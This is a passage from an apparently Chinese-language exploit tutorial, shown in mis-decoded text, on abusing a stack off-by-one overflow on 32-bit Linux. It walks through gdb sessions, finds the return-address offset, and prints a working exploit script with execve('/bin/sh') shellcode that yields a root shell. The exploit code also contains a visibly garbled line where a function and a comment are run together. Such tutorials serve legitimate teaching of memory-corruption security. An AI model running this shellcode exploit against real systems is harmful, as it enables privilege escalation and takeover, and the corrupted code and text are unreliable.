<p>å‰é¢è®²åˆ°ï¼Œç”¨æˆ·è¾“å…¥äº†256å­—èŠ‚å¤§å°çš„æ•°æ®ï¼ŒNULLå­—èŠ‚å°±ä¼šè¦†ç›–fooçš„EBPçš„LSBã€‚æ‰€ä»¥å½“å­˜å‚¨äºç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™æ­£ä¸Šæ–¹çš„fooçš„EBPè¢«å•ä¸ªNULLå­—èŠ‚è¦†ç›–æ—¶ï¼ŒEBPå°±ä¼šç”±0xbffff2d8 å˜ä¸º0xbffff200ã€‚ç»†çœ‹å †æ ˆå¸ƒå±€å›¾ï¼Œæˆ‘ä»¬ä¼šå‘ç°æ ˆåœ°å€0xbffff200å°±æ˜¯ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ—¢ç„¶ç”¨æˆ·è¾“å…¥å€¼å·²ç»è¢«å¤åˆ¶è¿›äº†è¿™ä¸ªç›®æ ‡ç¼“å†²åŒºï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±èƒ½å¾—åˆ°è¿™ä¸ªæ ˆåœ°å€(0xbffff200)çš„æ§åˆ¶æƒï¼ŒåŒæ—¶ä¹Ÿå¾—åˆ°äº†EIPçš„æ§åˆ¶æƒï¼Œä»è€Œå€Ÿæ­¤å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚æˆ‘ä»¬æ¥å‘é€ä¸€ä¸²å¤§å°ä¸º256å­—èŠ‚çš„â€œAâ€è¿›è¡Œæµ‹è¯•ã€‚</p>
<p>æµ‹è¯•ç¬¬ä¸€æ­¥ï¼šEBPè¦†ç›–åå‡ºç°è¿”å›åœ°å€è¦†ç›–æ˜¯å¦æœ‰å¯èƒ½ï¼Ÿ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c 'print "A"*256'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/obo/stack/vuln `python -c 'print "A"*256'`</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>ä¸Šè¿°è¾“å‡ºç»“æœæ˜¾ç¤ºï¼ŒEBPè¦†ç›–ä¼šè®©æˆ‘ä»¬å¾—åˆ°EIPçš„æ§åˆ¶æƒã€‚</p>
<p>æµ‹è¯•ç¬¬äºŒæ­¥ï¼šæ¥è‡ªç›®æ ‡ç¼“å†²åŒºçš„åç§»é‡æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™çš„èµ·å§‹ç«¯ä¸­æ‰¾åˆ°åç§»é‡ã€‚æˆ‘ä»¬è¿˜éœ€è®¾ç½®å¥½è¿”å›åœ°å€ã€‚åˆ‡è®°ï¼Œåœ¨off-by-oneæ¼æ´ä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸æ˜¯è¦è¦†ç›–æ ˆä¸­çš„å®é™…è¿”å›åœ°å€ï¼ˆåœ¨æ ˆç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨ä»£ç ä¸­æˆ‘ä»¬æ‰è¦†ç›–å®é™…è¿”å›åœ°å€ï¼‰ï¼Œè€Œæ˜¯æŠŠæ”»å‡»è€…æ§åˆ¶çš„ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™å†…çš„ä¸€ä¸ª4å­—èŠ‚å†…å­˜åŒºåŸŸè§†ä½œè¿”å›åœ°å€ä½ç½®ï¼Œå¯¹è¿™å—åŒºåŸŸè¿›è¡Œè¦†ç›–ï¼ˆåœ¨off-by-oneæº¢å‡ºä¹‹åï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦(ä»â€˜bufâ€™ä¸­)æ‰¾åˆ°è¿™ä¸ªè¿”å›åœ°å€ä½ç½®çš„åç§»é‡â€”â€”è€Œè¿™ä¸ªåç§»é‡ä¹Ÿæ˜¯ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™æœ¬èº«çš„ä¸€éƒ¨åˆ†ã€‚<br>è¿™æ®µè¯æœ‰ç‚¹ç»•ï¼Œæ²¡å…³ç³»ï¼Œç»§ç»­å¾€ä¸‹è¯»å°±å¥½ã€‚<br>æˆ‘ä»¬å…ˆè¯•ç€ä» text æ®µåœ°å€0x0804840å¼€å§‹å°è¯•ç†è§£CPUçš„æ‰§è¡Œï¼š</p>
<ul>
<li>0x08048490 - call strcpy â€“ æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤ä¼šå¯¼è‡´off-by-oneæº¢å‡ºï¼Œå› æ­¤ï¼ˆå‚¨å­˜åœ¨æ ˆåœ°å€0xbffff2ccä¸­çš„ï¼‰fooçš„EBPå€¼å°†ä¼šç”±0xbffff2d8å˜ä¸º0xbffff200ã€‚</li>
<li>0x08048495 - leave - leaveæŒ‡ä»¤é‡Šæ”¾äº†è¿™ä¸ªå‡½æ•°çš„æ ˆç©ºé—´å¹¶ä¸”æ¢å¤äº†EBPã€‚</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">leave: mov ebp, esp;        <span class="comment">//unwind stack space by setting esp to ebp. </span></div><div class="line">       pop ebp;             <span class="comment">//restore ebp</span></div><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff2cc</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0xbffff200 (Overwritten EBP value is now stored in ebp register); esp = 0xbffff2d0</span></div></pre></td></tr></table></figure>
<ul>
<li>0x08048495 - ret - è¿”å›åˆ°fooçš„æŒ‡ä»¤0x08048475ã€‚</li>
<li>0x08048475 - leave - leaveæŒ‡ä»¤é‡Šæ”¾äº†è¿™ä¸ªå‡½æ•°çš„æ ˆç©ºé—´å¹¶ä¸”æ¢å¤äº†EBPã€‚</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff200 (As part of unwinding esp is shifted down instead of up!!)</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0x41414141; esp = 0xbffff204</span></div></pre></td></tr></table></figure>
<ul>
<li>0x08048476 - ret - è¿”å›åˆ°å‚¨å­˜åœ¨ESP (0xbffff204)ä¸­çš„æŒ‡ä»¤ä¸­ã€‚æ­¤æ—¶ESPæŒ‡å‘è¢«æ”»å‡»è€…æ§åˆ¶çš„ç¼“å†²åŒºï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥å›åˆ°ä»»ä½•ä»–æƒ³è¦å®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„åœ°æ–¹ã€‚</li>
</ul>
<p>ç°åœ¨æˆ‘ä»¬å›åˆ°â€œåœ¨ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™ä¸­å¯»æ‰¾è¿”å›åœ°å€çš„åç§»é‡â€çš„æœ€åˆæµ‹è¯•ä¸Šã€‚å¦‚å †æ ˆå¸ƒå±€å›¾æ‰€ç¤ºï¼Œâ€˜bufâ€™ä½äº0xbffff158ï¼Œå¹¶ä¸”ç”±ç´§éšå…¶åçš„CPUæ‰§è¡Œä¸­å¯çŸ¥ï¼Œç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™å†…çš„è¿”å›åœ°å€ä½ç½®æ˜¯0xbffff204ã€‚å› æ­¤ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™ä¸­è¿”å›åœ°å€çš„åç§»é‡æ˜¯0xbffff204 â€“ 0xbffff158 = 0xacï¼Œå› æ­¤ç”¨æˆ·è¾“å…¥â€œAâ€<em>172 + â€œBâ€</em>4 + â€œAâ€*80ï¼Œç”¨â€œBBBBâ€è¦†ç›–äº†EIPã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ cat exp_tst.py </div><div class="line">#exp_tst.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">buf = "A" * 172</div><div class="line">buf += "B" * 4</div><div class="line">buf += "A" * 80</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div><div class="line"></div><div class="line">$ python exp_tst.py </div><div class="line">Calling vulnerable program</div><div class="line">$ sudo gdb -q vuln </div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/obo/stack/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) core-file core</div><div class="line">[New LWP 4055]</div><div class="line">warning: Can't read pathname for load map: Input/output error.</div><div class="line">Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.</div><div class="line">Program terminated with signal 11, Segmentation fault.</div><div class="line">#0 0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>ä¸Šè¿°è¾“å‡ºç»“æœæ˜¾ç¤ºï¼Œæ”»å‡»è€…æ§åˆ¶äº†è¿”å›åœ°å€ã€‚æ­¤æ—¶è¿”å›åœ°å€ä½äºbufçš„åç§»(0xac)å¤„ã€‚æœ‰äº†ä¸Šé¢è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºèƒ½å®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´åˆ©ç”¨ç¨‹åºäº†ã€‚</p>
<p><u><em>æ¼æ´åˆ©ç”¨ä»£ç ï¼š</em></u><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">#Spawn a shell. </div><div class="line"><span class="meta">#execve(/bin/sh) Size- 28 bytes.</span></div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"</span></div><div class="line"></div><div class="line">ret_addr = <span class="number">0xbffff218</span></div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numturn Address + NOP's + Shellcode + Junk</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">172</span></div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += <span class="string">"\x90"</span> * <span class="number">30</span></div><div class="line">buf += scode</div><div class="line">buf += <span class="string">"A"</span> * <span class="number">22</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure></p>
<p>æ‰§è¡Œä¸Šè¿°æ¼æ´åˆ©ç”¨ç¨‹åºå°†ä¼šè·å–root shellï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p>Off-by-oneçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªç‰¹åˆ«è ¢çš„æ¼æ´ï¼Œè€Œä¸”ç¨‹åºå¼€å‘è€…ä¸€ä¸ªè¿™ä¹ˆå°çš„é”™è¯¯ä¹Ÿèƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼Œè¿™ä¹Ÿå¤ªè¯¡å¼‚äº†ã€‚é‚£ä¹ˆï¼Œoff-by-oneæ¼æ´æ˜¯ä¸æ˜¯ä¸€å®šä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå‘¢ï¼Ÿ</p>
<h3 id="0X03-å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ"><a href="#0X03-å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ" class="headerlink" title="0X03 å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ"></a>0X03 å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ</h3><p>ç­”æ¡ˆéå¸¸ç®€å•ã€‚å¦‚æœé‚£æ ·çš„è¯ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨â€œEBPè¦†ç›–â€æ–¹æ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´äº†å‘—ï¼ï¼ˆä¸è¿‡å‘¢ï¼Œæ¯•ç«Ÿè¿™ä¸ªæ¼æ´åœ¨ä»£ç ä¸­æ˜¯ç¡®å®å­˜åœ¨çš„ï¼Œæ‰€ä»¥è‚¯å®šæœ‰å…¶ä»–çš„æ¼æ´åˆ©ç”¨æ–¹æ³•å•¦ã€‚ğŸ˜›ï¼‰</p>
<h3 id="0X04-ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹"><a href="#0X04-ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹" class="headerlink" title="0X04 ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹"></a>0X04 ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹</h3><p><strong>æƒ…å†µ1</strong>ï¼š ä¸€äº›å…¶ä»–çš„æœ¬åœ°å˜é‡å‡ºç°åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> x = <span class="number">10</span>; <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [2] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [3] */</span> </div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure>
<p>å› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤¹åœ¨ç¼“å†²åŒºâ€˜bufâ€™æœ«ç«¯å’ŒEBPä¹‹é—´çš„ä¼šæ˜¯ä¸€ä¸ªæœ¬åœ°å˜é‡ï¼Œè¿™å°±ä¸å…è®¸æˆ‘ä»¬å»è¦†ç›–EBPçš„LSBäº†ã€‚</p>
<p><strong>æƒ…å†µ2</strong>: å¯¹é½ç©ºé—´â€”â€”gccå¯¹é½æ ˆç©ºé—´è¾¹ç•Œé»˜è®¤ä¸º16å­—èŠ‚ã€‚å³åœ¨åˆ›å»ºæ ˆç©ºé—´ä¹‹å‰ï¼ŒESPçš„æœ€åå››ä¸ªå­—èŠ‚å°±è¢«â€˜andâ€™æŒ‡ä»¤æ¸…é›¶äº†ã€‚å…·ä½“å‚è§ä¸‹æ–¹å‡½æ•°åæ±‡ç¼–ä»£ç ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi</div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp               <span class="comment">//Stack space aligned to 16 byte boundary</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: sub $<span class="number">0x20</span>,%esp                     <span class="comment">//create stack space</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤¹åœ¨ç¼“å†²åŒºâ€˜bufâ€™æœ«ç«¯å’ŒEBPä¹‹é—´çš„ä¼šæ˜¯ä¸€ä¸ªï¼ˆæœ€å¤§ä¸º12å­—èŠ‚çš„ï¼‰å¯¹é½ç©ºé—´ï¼Œè¿™å°±ä¸å…è®¸æˆ‘ä»¬å»è¦†ç›–EBPçš„LSBäº†ã€‚</p>
<p>ç”±äºè¿™ä¸ªåŸå› ï¼Œæˆ‘ä»¬åœ¨ç¼–è¯‘æ¼æ´åˆ©ç”¨ä»£ç (vuln.c)æ—¶æ·»åŠ äº†gccå‚æ•°<strong><em>â€œ-mpreferred-stack-boundary=2â€</em></strong>ã€‚</p>
<p><u><em>æ±‚åŠ©ï¼š</em></u>å¦‚æœåœ¨åˆ›å»ºæ ˆå†…å®¹ä¹‹å‰ESPè¾¹ç•Œå·²ç»å¯¹é½ä¸º16å­—èŠ‚çš„è¯è¯¥æ€ä¹ˆåŠï¼Ÿè¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿ç¨‹åºä»¥gccé»˜è®¤çš„16å­—èŠ‚æ ˆè¾¹ç•Œç¼–è¯‘ï¼ŒæŒ‰ç†æ¥è¯´â€œEBPè¦†ç›–â€æ³•ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„ã€‚ä½†æ˜¯æˆ‘ä¸€ç›´éƒ½å†™ä¸å‡ºæœ‰æ•ˆä»£ç ã€‚åœ¨æˆ‘æ‰€æœ‰çš„è¯•è¿è¡Œç¨‹åºä¸­ï¼Œåˆ›å»ºæ ˆç©ºé—´ä¹‹å‰ï¼ŒESPè¾¹ç•Œéƒ½æ²¡æœ‰å¯¹é½16å­—èŠ‚ã€‚ä½†æ˜¯ä¸ç®¡æˆ‘å¤šä¹ˆå°å¿ƒåœ°åˆ›å»ºæ ˆå†…å®¹ï¼Œgccæ€»æ˜¯ç»™æœ¬åœ°å˜é‡æ·»åŠ é¢å¤–ç©ºé—´ï¼Œè¿™æ ·ESPè¾¹ç•Œå°±ä¸èƒ½å¯¹é½16å­—èŠ‚ã€‚å¦‚æœä»»ä½•äººæœ‰æœ‰æ•ˆä»£ç æˆ–è€…çŸ¥é“ä¸ºä»€ä¹ˆESPæ€»æ˜¯æ— æ³•å¯¹é½ï¼Œéº»çƒ¦å‘Šè¯‰æˆ‘ï¼æ‹œæ‰˜äº†ï¼</p>
<p><u><em>å‚è€ƒæ–‡ç« ï¼š</em></u></p>
<ol>
<li><a href="http://seclists.org/bugtraq/1998/Oct/109" target="_blank" rel="external">http://seclists.org/bugtraq/1998/Oct/109</a> </li>
</ol>
<hr>
<p><strong>è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜</strong>ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€Š<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-æ ˆå†…Off-by-oneæ¼æ´åˆ©ç”¨</a>ã€‹ä¸ä½œè€…ä¿¡æ¯ï¼š<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSecå‡ºå“</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack/">Stack</a></li></ul>

      
        
	<div id="comment">
	
	<!-- å¤šè¯´è¯„è®ºæ¡† start -->
	 <div class="ds-thread" data-thread-key="/20161231/stackoffbyone/" data-title="æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨" data-url="http://yoursite.com/20161231/stackoffbyone/"></div>
	<!-- å¤šè¯´è¯„è®ºæ¡† end -->
	<!-- å¤šè¯´å…¬å…±JSä»£ç  start (ä¸€ä¸ªç½‘é¡µåªéœ€æ’å…¥ä¸€æ¬¡) -->
	<script type="text/javascript">
	var duoshuoQuery = {short_name:"csyssec"};
	  (function() {
	    var ds = document.createElement('script');
	    ds.type = 'text/javascript';ds.async = true;
	    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
	    ds.charset = 'UTF-8';
	    (document.getElementsByTagName('head')[0] 
	     || document.getElementsByTagName('body')[0]).appendChild(ds);
	  })();
	  </script>
	<!-- å¤šè¯´å…¬å…±JSä»£ç  end -->
	
	</div>
	<link rel="stylesheet" href="/css/comment.css">


      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/20161230/integerflow/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">ä¸‹ä¸€ç¯‡</strong>
      <div class="article-nav-title">æ•´å‹æº¢å‡ºåˆ©ç”¨</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">æ–‡ç« ç›®å½•</strong>
    
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0X01-ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ"><span class="toc-number">1.</span> <span class="toc-text">0X01 ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X02-å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ"><span class="toc-number">2.</span> <span class="toc-text">0X02 å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X03-å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ"><span class="toc-number">3.</span> <span class="toc-text">0X03 å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X04-ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹"><span class="toc-number">4.</span> <span class="toc-text">0X04 ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹</span></a></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>
      <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      ç‰ˆæƒæ‰€æœ‰&copy; 2016 Index of Computer System and Security ä¿ç•™æ‰€æœ‰æƒåˆ©.
      </div>
      <div class="site-credit">
        è‡ªè±ªåœ°ä½¿ç”¨ <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
</script>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/syssec" class="mobile-nav-link">Syssec</a>
  
    <a href="/architecture" class="mobile-nav-link">Architecture</a>
  
    <a href="/virtualization" class="mobile-nav-link">Virtualization</a>
  
    <a href="/conferences" class="mobile-nav-link">Conferences</a>
  
    <a href="/academy" class="mobile-nav-link">Academy</a>
  
    <a href="/celebrity" class="mobile-nav-link">Celebrity</a>
  
    <a href="/contribution" class="mobile-nav-link">Contribution</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>





  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
  

  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261078922&web_id=1261078922" language="JavaScript"></script>
  </div>


</body>
</html>
